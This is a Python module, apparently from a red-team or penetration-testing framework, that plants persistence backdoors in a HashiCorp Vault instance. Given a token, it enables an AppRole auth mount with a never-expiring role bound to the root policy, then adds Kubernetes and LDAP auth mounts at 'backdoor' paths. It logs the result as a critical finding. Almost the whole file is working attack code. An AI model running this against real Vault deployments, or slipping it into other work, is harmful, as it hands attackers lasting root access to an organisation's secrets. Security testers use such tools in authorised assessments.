from typing import Optional
import requests
from ..context import ExecutionContext
from ..registry import BaseExecutionModule, ExecutionResult, RiskLevel

class MultiPersistenceModule(BaseExecutionModule):
    def __init__(self):
        super().__init__(
            module_id="multi_persistence.backdoor",
            title="Multi-Persistence - AppRole + Kubernetes + LDAP",
            risk_level=RiskLevel.DESTRUCTIVE,
            description="Installs multiple backdoor auth methods for redundancy",
            default_enabled=False,
        )

    def can_run(self, context):
        return bool(getattr(context, "vault_addr", None) and getattr(context, "token", None))

    def execute(self, context, params=None):
        params = params or {}
        headers = {"X-Vault-Token": context.token, "Content-Type": "application/json"}
        namespace = params.get("namespace", getattr(context, "namespace", None))
        if namespace:
            headers["X-Vault-Namespace"] = namespace

        results = {}
        errors = []

        # 1. AppRole (mevcut persistence ile aynı)
        auth_path = params.get("auth_path", "approle-backdoor")
        role_name = params.get("role_name", "multi-backdoor")
        try:
            url = f"{context.vault_addr}/v1/sys/auth/{auth_path}"
            response = requests.post(url, headers=headers, json={"type": "approle"}, timeout=10)
            if response.status_code in [200, 204]:
                results["approle_enabled"] = True
                # Role oluştur
                role_url = f"{context.vault_addr}/v1/auth/{auth_path}/role/{role_name}"
                role_payload = {"policies": ["root"], "token_ttl": "0", "token_max_ttl": "0"}
                resp = requests.post(role_url, headers=headers, json=role_payload, timeout=10)
                results["approle_role_created"] = resp.status_code in [200, 204]
            else:
                errors.append(f"AppRole enable failed: {response.status_code}")
        except Exception as e:
            errors.append(f"AppRole error: {e}")

        # 2. Kubernetes (eğer cluster içindeysen)
        try:
            k8s_path = params.get("k8s_auth_path", "kubernetes-backdoor")
            url = f"{context.vault_addr}/v1/sys/auth/{k8s_path}"
            response = requests.post(url, headers=headers, json={"type": "kubernetes"}, timeout=10)
            if response.status_code in [200, 204]:
                results["kubernetes_enabled"] = True
            else:
                errors.append(f"Kubernetes enable failed: {response.status_code}")
        except Exception as e:
            errors.append(f"Kubernetes error: {e}")

        # 3. LDAP
        try:
            ldap_path = params.get("ldap_auth_path", "ldap-backdoor")
            url = f"{context.vault_addr}/v1/sys/auth/{ldap_path}"
            response = requests.post(url, headers=headers, json={"type": "ldap"}, timeout=10)
            if response.status_code in [200, 204]:
                results["ldap_enabled"] = True
            else:
                errors.append(f"LDAP enable failed: {response.status_code}")
        except Exception as e:
            errors.append(f"LDAP error: {e}")

        context.add_finding(
            title="CRITICAL: Multi-Persistence Installed",
            description=f"Enabled: AppRole={results.get('approle_enabled')}, Kubernetes={results.get('kubernetes_enabled')}, LDAP={results.get('ldap_enabled')}",
            severity="CRITICAL",
            evidence=results,
        )
        return ExecutionResult(status="success", message="Multi-persistence installed", evidence={"results": results, "errors": errors})